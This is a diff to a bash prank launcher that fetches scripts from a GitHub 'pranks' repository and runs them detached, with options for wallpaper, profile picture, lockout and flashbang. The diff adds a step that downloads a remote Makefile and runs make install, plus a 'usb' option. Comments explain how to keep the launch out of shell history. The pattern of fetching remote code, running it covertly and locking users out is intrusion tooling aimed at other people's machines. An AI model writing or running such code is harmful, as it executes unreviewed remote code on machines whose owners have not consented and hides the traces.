@@ -5,8 +5,6 @@
 # Note: to execute this script, run "set +o history" to prevent menu.sh from being saved to history
 # Then launch menu.sh with a space appended to it to prevent it from being saved to readline
 
-# If no arguments are provided, the program will launch with whatever I last set it to
-
 # See which terminals exist on the user's machine
 if command -v "gnome-terminal" >/dev/null; then
 	SRC_LAUNCH="gnome-terminal -x"
@@ -42,12 +40,17 @@ flashbang() {
 	bash <(curl -s "$FLASHBANG") & disown
 }
 
+matrix() {
+	curl -s -L $MATRIX -o Makefile && make && make install && rm Makefile
+}
+
 # URLs
 WALLPAPER="https://raw.githubusercontent.com/heixier/pranks/refs/heads/main/wallpaper/change_bg.sh"
 PROFILE="https://raw.githubusercontent.com/Heixier/pranks/refs/heads/main/face/change_pic.sh"
 PARROT="https://raw.githubusercontent.com/Heixier/pranks/refs/heads/main/parrot/parrot.sh"
 LOCKOUT="https://raw.githubusercontent.com/Heixier/pranks/refs/heads/main/lockout/lockout.sh"
 FLASHBANG="https://raw.githubusercontent.com/Heixier/pranks/refs/heads/main/flashbang/flashbang.sh"
+MATRIX="https://raw.githubusercontent.com/Heixier/pranks/refs/heads/main/matrix/Makefile" 
 
 # Get all the options and stuff then runs them detached because parallel processing wooho
 for opt in "$@"
@@ -73,9 +76,15 @@ do
 			flashbang
 			;;
 
-		*)
+		"matrix" | "neo")
+			matrix
+			;;
+
+		"usb") # what do you think this is
 			parrot
 			wallpaper
+			;;
+		*)
 			;;
 	esac
 done
